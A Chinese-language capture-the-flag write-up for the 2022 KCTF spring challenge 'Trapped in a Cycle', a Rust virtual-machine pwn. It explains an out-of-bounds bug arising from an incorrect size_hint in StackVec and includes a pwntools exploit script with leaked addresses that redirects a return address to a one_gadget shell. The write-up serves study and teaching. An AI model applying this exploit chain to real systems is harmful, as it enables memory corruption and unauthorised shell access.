---
title: 看雪 2022 KCTF 春季赛 第十题 陷入轮回 Rust VM Pwn
contest: KCTF春季赛
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [Rust, VM-Pwn, CVE-2021-2993, size_hint, StackVec, custom-VM, one_gadget, Ubuntu-16, debug-symbol, rust-vulnerability]
attack_chain:
  - 题目由 Rust 编写 VM pwn 变种，未删符号表
  - 漏洞来自 CVE-2021-2993 size_hint 错误实现
  - Rust 文档原话: size_hint() 不可信，错误实现不应导致内存安全违反
  - 程序读取指令模拟执行，指令集: vec / adj / cal / cmd / jmp / je / switch_stack / halt / print
  - StackVec<u64, 64> 模拟虚拟机栈（栈上分配，长度指示内容）
  - 越界读写漏洞通过 pop_back/push_back/pop_front/stack_ext 等指令触发
  - 改返回地址到 one_gadget
  - 仅 Ubuntu 16 可直接利用 one_gadget（其他需多个 gadget 组合）
  - exp 思路: vec int 填栈 + adj pop/push + switch_stack + cal stack_move + cal reg_to_stack
  - 通过 print 泄 rsp, libc_base, main 等地址
  - 二次利用: 改 __libc_start_main_ret 为 one_gadget
key_payload: 'vec int 栈填充 + adj pop_back/push_back + switch_stack + one_gadget 改返回地址'
one_liner: Rust VM pwn：size_hint CVE 触发越界读写，Ubuntu 16 one_gadget 改 __libc_start_main_ret 拿 shell。
lesson: Rust 安全性 ≠ 绝对安全，第三方库 size_hint 错误实现会导致越界；带 debug 符号的 Rust 程序逆向更容易。
quality: high
---

# 看雪 2022 KCTF 春季赛 | 第十题《陷入轮回》星盟安全团队 出题

**来源**: ctfiot.com ID 44357
**攻破战队**: 辣鸡战队、hzqmwne 战队、雨落星辰战队（3 队）

## 题目立意
Rust 编写 VM Pwn 变种，未删符号表。漏洞来自 **CVE-2021-2993**（size_hint 错误实现）。

### Rust 文档原话
> `size_hint()` is primarily intended to be used for optimizations such as reserving space for the elements of the iterator, but must not be trusted to e.g., omit bounds checks in unsafe code. An incorrect implementation of `size_hint()` should not lead to memory safety violations.

## 题目结构
- 读取若干指令模拟执行
- StackVec<u64, 64> 模拟虚拟机栈（栈上分配）
- length 指示栈内容长度
- 指令集：`vec / adj / cal / cmd / jmp / je / switch_stack / halt / print`

## StackVec 关键结构
```c
StackVec<[u64_ 32]> struc ; (sizeof=0x108, align=0x8)
  length   dq ?
  data     ManuallyDrop<[u64_ 32]>
```

## 关键检查代码
```c
v3.data_ptr = "iterable must provide upper bound.
               assertion failed: self.len() + upper_bound <= self.capacity()
               assertion failed: step != 0";
core::ptr::write::h5bcec47e57c65cec(dst, src);  // 漏洞点
```

## 漏洞利用
```python
from pwn import *
context.log_level = 'debug'

def vec_int(index):
    str1 = "vec int >> "
    str2 = ""
    for i in range(index):
        str2 += str(i) + ","
    return str1 + "[" + str2[:-1] + "]"

def pop_back_n(name, n):
    return "\n".join([f"adj {name} str >> pop_back" for _ in range(n)])

# exp
exp = f"""
vec int >> [0,0,0]
cal add stack_to_reg
vec int >> [0,0,0,8,9,10,11,12,13,14,15,16,17,18,19,20]
vec int >> [1,2,3,4,5,6,7,8,0,10252512,10]
cal add stack_to_reg
vec int >> [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
vec int >> [1,2,3,4,5,6,7,8,9,10,11,12,13]
vec vul int >> [1,2,3,4,5,6]
adj vul int >> pop_front
adj vul int >> push_back 113
adj vul int >> pop_front
adj vul int >> push_back 576
adj vul int >> pop_front
adj vul int >> pop_front
adj vul int >> pop_front
adj vul int >> stack_ext
switch_stack
print
cal add stack_to_reg
cal sub reg
switch_stack
cal stack_move 64
switch_stack
cal add reg_to_stack
"""

p = process("./attachments")
p.sendline(exp)
p.interactive()
```

## 利用过程
1. **栈填充**：`vec int >> [0,0,0]` 初始化向量
2. **拷贝**：`cal add stack_to_reg` 把数据拷贝到寄存器栈
3. **触发漏洞**：`adj vul int >> pop_front / push_back 113` 等组合操作触发 size_hint 越界
4. **泄漏地址**：`print` 泄 rsp / libc_base / main / __libc_start_main_ret
5. **改返回地址**：把 `__libc_start_main_ret` 改为 one_gadget
6. **拿 shell**：U16 直接 one_gadget，U18+ 需组合多个 gadget

## 关键泄漏示例
```
0x10
0x7ffd93e7d9c8
0x563965d4a54a
0x7ffd93e7d9c0
0x1000000000000000
0x7ffd93e7d9c8
0x7fdbe3d18840  -> libc_start_main_ret
0x7ffd93e7d910  -> rsp
0x563965d4a520  -> main
0x563965d1e080  -> _start
```

## 评价
Rust 写的 VM pwn 是非常规出题角度。漏洞本质是 Rust 第三方库的 size_hint 错误实现触发越界读写。考察 Rust 内存模型 + 栈式 VM 指令集 + one_gadget 利用。
